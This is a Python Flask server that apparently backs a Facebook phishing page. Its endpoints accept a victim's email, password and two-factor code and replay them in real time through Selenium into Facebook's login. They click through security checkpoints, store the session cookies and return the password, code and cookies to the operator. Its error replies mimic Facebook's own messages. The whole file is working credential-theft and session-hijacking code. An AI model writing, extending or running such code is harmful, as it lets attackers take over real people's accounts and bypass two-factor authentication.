from flask import Flask, request, jsonify
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException
import time
import pickle
from selenium.webdriver.chrome.options import Options


app = Flask(__name__)

# Đường dẫn lưu file cookies
COOKIES_FILE_PATH = 'facebook_cookies.pkl'
url = "https://www.facebook.com/login"

def create_headless_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--window-size=1920x1080")
    driver = webdriver.Chrome(options=chrome_options, executable_path="/usr/local/bin/chromedriver-linux64")
    return driver

def login_to_facebook(email, password, param):
    # driver = create_headless_driver()

    driver = webdriver.Chrome()

    driver.get(url)
    
    email_element = driver.find_element("id", "email")
    email_element.send_keys(email)
    
    password_element = driver.find_element("id", "pass")
    password_element.send_keys(password)
    
    time.sleep(0.3)
    password_element.send_keys(Keys.RETURN)
    time.sleep(5)

    is_login_successful = param not in driver.current_url
    pickle.dump(driver.get_cookies(), open(COOKIES_FILE_PATH, "wb"))

    driver.quit()
    
    return is_login_successful

def login_towfa(email, password, towfa, param):
    # driver = create_headless_driver()
    driver = webdriver.Chrome()


    driver.get(url)
    
    email_element = driver.find_element("id", "email")
    email_element.send_keys(email)
    
    password_element = driver.find_element("id", "pass")
    password_element.send_keys(password)
    
    time.sleep(0.3)
    password_element.send_keys(Keys.RETURN)

    if towfa and param in driver.current_url:
        try:
            towfa_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "approvals_code"))
            )
            towfa_element.send_keys(towfa)
            towfa_element.send_keys(Keys.RETURN)
            time.sleep(2)

             # Click vào nút "Tiếp tục"
            continue_button = driver.find_element("id", "checkpointSubmitButton")
            continue_button.click()

            time.sleep(2)  # Đợi để hoàn tất quy trình

            # Click vào nút "Tiếp tục"
            continue_button = driver.find_element("id", "checkpointSubmitButton")
            continue_button.click()

            time.sleep(2)  # Đợi để hoàn tất quy trình

            # Click vào nút "Tiếp tục"
            continue_button = driver.find_element("id", "checkpointSubmitButton")
            continue_button.click()
            
            time.sleep(2)  # Đợi để hoàn tất quy trình

            # Click vào nút "Đây là tôi" sau bước "Xem lại lần đăng nhập gần đây"
           # Click vào nút "Tiếp tục"
            continue_button = driver.find_element("id", "checkpointSubmitButton")
            continue_button.click()

        except TimeoutException:
            print("2FA input field was not found or there was another issue.")
    
    cookies = driver.get_cookies()
    pickle.dump(cookies, open(COOKIES_FILE_PATH, "wb"))
    driver.quit()
    
    return towfa, cookies

def email_exists(email, password):
    param = "login_attempt"
    return login_to_facebook(email, password, param)

def verify_password(email, password):
    param = "www_first_password_failure"
    is_successful = login_to_facebook(email, password, param)
    return is_successful

def verify_towfa(email, password, towfa):
    param = "checkpoint"
    is_successful = login_towfa(email, password, towfa, param)
    return is_successful

@app.route('/check-email', methods=['POST'])
def check_email():
    data = request.get_json()
    email = data.get('email')
    default_password = "123456789"
    
    if email_exists(email, default_password):
        return jsonify({"message": "Email và sđt có liên kết facebook, chờ nhập pass...", "status": 200, "email": email}), 200
    else:
        return jsonify({"message": "The mobile number you entered is not connected to any account. Find your account and log in.", "status": 400}), 400

@app.route('/check-password', methods=['POST'])
def check_password():
    data = request.get_json()
    email = data.get('email')
    password = data.get('password')
    
    if verify_password(email, password):
        return jsonify({"message": "Pass đúng", "status": 200, "pass" : password}), 200
    else:
        return jsonify({"message": "The password you entered is incorrect.", "status": 400}), 400

@app.route('/check-towfa', methods=['POST'])
def check_towfa():
    data = request.get_json()
    email = data.get('email')
    password = data.get('password')
    towfa = data.get('towfa')
    
    is_successful, cookies = verify_towfa(email, password, towfa)

    if is_successful:
        return jsonify({
            "message": "Login 2FA bị Checkpoin",
            "status": 200, 
            "tow_fa": towfa,
            "cookies" : cookies}), 200
    else:
        return jsonify({
            "message": "We require your facebook account to be active before submitting", 
            "status": 400}), 400
    
@app.route('/test', methods=['GET'])
def test():
    
    return jsonify({
        "message": "test", 
        "status": 200}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5003)
